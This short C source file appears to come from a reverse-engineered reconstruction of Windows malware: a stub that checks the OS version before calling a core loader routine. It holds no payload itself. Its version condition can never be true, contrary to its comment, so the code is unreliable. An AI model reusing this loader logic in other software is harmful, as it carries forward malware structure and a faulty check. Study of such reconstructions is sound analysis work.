

#include "3. OS.h"
#include "2. STUBHandler.h"

#include "config.h"

/*************************************************************************
** This function check that the system is not too old or too new,       **
** it works with all the versions of Windows from Windows 2000 to       **
** Windows 8 included, in the asm code the function is called with a    **
** value (0 and 1) but actually it is not used, maybe it was used in    **
** debug mode.                                                          **
*************************************************************************/
void CheckSystemVersion(BOOL bBool)
{
	OSVERSIONINFO lpSysInfo;
	lpSysInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	
	if(!GetVersionEx(&lpSysInfo)
	|| lpSysInfo.dwPlatformId != VER_PLATFORM_WIN32_NT
	|| (lpSysInfo.dwMajorVersion < 5 && lpSysInfo.dwMajorVersion > 6))
	{
		DEBUG_P("Wrong system version detected.")
		return;
	}
	
	Core_Load();
}